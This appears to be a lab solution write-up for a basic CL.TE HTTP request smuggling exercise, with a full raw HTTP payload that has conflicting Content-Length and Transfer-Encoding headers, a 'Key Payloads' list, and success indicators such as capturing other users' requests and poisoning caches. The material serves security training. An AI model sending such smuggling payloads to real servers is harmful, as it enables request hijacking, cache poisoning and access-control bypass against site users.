## HTTP request smuggling, basic CL.TE vulnerability

**Category:** request_smuggling
**Difficulty:** Unknown

### Description
This lab involves a front-end and back-end server, and the front-end server doesn't support chunked encoding. The front-end server rejects requests that aren't using the GET or POST method.

### Solution Steps
Using Burp Repeater, issue the following request twice:
POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 6
Transfer-Encoding: chunked

0

G
The second response should say:
Unrecognized method GPOST
.

### Key Payloads
- `GPOST`
- `POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 6
Transfer-Encoding: chunked

0

G`
- `Unrecognized method GPOST`

### Indicators of Success
- Request desync between front/back-end
- Subsequent request poisoned
- Other user's request captured
- Cache poisoned via smuggling
- Access controls bypassed
